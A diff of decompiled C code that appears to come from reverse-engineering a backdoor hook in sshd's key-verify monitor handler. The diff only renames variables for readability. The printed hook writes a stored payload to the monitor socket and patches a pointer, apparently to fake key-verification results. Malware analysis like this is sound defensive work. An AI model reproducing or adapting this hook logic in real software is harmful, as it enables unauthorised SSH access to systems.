@@ -16,26 +16,24 @@
 int mm_answer_keyverify_hook(ssh *ssh,int sock,sshbuf *m)
 
 {
-  libc_imports_t *funcs;
-  long lVar1;
-  ssize_t sVar2;
-  sshd_payload_ctx_t *payload_ctx;
   libc_imports_t *libc_imports;
+  sshd_payload_ctx_t *payload_ctx;
+  ssize_t write_result;
   
   if (global_ctx == 0) {
     return 0;
   }
-  funcs = *(libc_imports_t **)(global_ctx + 0x10);
-  if ((funcs != (libc_imports_t *)0x0) && (lVar1 = *(long *)(global_ctx + 0x20), lVar1 != 0)) {
-    if ((*(ushort *)(lVar1 + 0x84) != 0) &&
-       ((*(void **)(lVar1 + 0x88) != (void *)0x0 &&
-        (sVar2 = fd_write(sock,*(void **)(lVar1 + 0x88),(ulong)*(ushort *)(lVar1 + 0x84),funcs),
-        -1 < sVar2)))) {
-      **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd8);
+  libc_imports = *(libc_imports_t **)(global_ctx + 0x10);
+  if ((libc_imports != (libc_imports_t *)0x0) && (payload_ctx = *(long *)(global_ctx + 0x20), payload_ctx != 0)) {
+    if ((*(ushort *)(payload_ctx + 0x84) != 0) &&
+       ((*(void **)(payload_ctx + 0x88) != (void *)0x0 &&
+        (write_result = fd_write(sock,*(void **)(payload_ctx + 0x88),(ulong)*(ushort *)(payload_ctx + 0x84),libc_imports),
+        -1 < write_result)))) {
+      **(undefined8 **)(payload_ctx + 0xa0) = *(undefined8 *)(payload_ctx + 0xd8);
       return 1;
     }
-    if (funcs->exit != (pfn_exit_t)0x0) {
-      (*funcs->exit)(0);
+    if (libc_imports->exit != (pfn_exit_t)0x0) {
+      (*libc_imports->exit)(0);
     }
   }
   return 0;
